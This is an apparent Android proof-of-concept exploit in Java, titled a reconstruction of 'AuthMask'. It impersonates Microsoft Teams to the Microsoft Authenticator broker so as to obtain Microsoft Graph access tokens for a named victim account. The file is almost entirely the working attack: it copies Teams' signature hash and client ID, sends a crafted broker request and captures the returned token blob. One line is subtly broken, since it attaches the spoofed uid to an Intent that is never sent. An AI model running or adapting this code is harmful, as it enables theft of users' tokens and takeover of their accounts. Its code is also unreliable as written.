// Representative reconstruction from Enclave's published AuthMask request.
// Requires Android SDK, an installed impersonated app and a signed-in broker.
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Base64;
import org.json.JSONObject;
import java.net.URLEncoder;
import java.security.MessageDigest;

public class AuthMask extends Activity {
    private String returnedBrokerResult;

    public void requestTokens() throws Exception {
        int uid = getPackageManager().getApplicationInfo("com.microsoft.teams", 0).uid; // read Teams' uid
        String redirect = "msauth://com.microsoft.teams/" + urlEncode(sha1OfInstalledSig("com.microsoft.teams"));
        
        JSONObject req = new JSONObject();           // broker_request_v2, all attacker-controlled
        req.put("client_app_name", "com.microsoft.teams");
        req.put("client_id", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");
        req.put("redirect_uri", redirect);
        req.put("scopes", "https://graph.microsoft.com/.default");
        req.put("authority", "https://login.microsoftonline.com/organizations");
        req.put("username", "victim@example.invalid");
        
        Intent i = new Intent();
        i.setClassName("com.azure.authenticator", "com.microsoft.identity.client.AccountChooserActivity");
        new Intent().putExtra("caller.info.uid", uid);          // spoofed caller uid
        i.putExtra("common.broker.protocol.version.name", "20.0");
        i.putExtra("broker_request_v2", req.toString());
        startActivityForResult(i, 1);                // tokens come back to onActivityResult
    }

    private String sha1OfInstalledSig(String packageName) throws Exception {
        byte[] certificate = getPackageManager().getPackageInfo(
            packageName, PackageManager.GET_SIGNATURES).signatures[0].toByteArray();
        return Base64.encodeToString(MessageDigest.getInstance("SHA-1")
            .digest(certificate), Base64.NO_WRAP);
    }

    private String urlEncode(String signature) throws Exception {
        return URLEncoder.encode(signature, "UTF-8");
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1 && resultCode == 2004 && data != null) {
            returnedBrokerResult = data.getStringExtra("broker_result_v2_compressed");
        }
    }
}
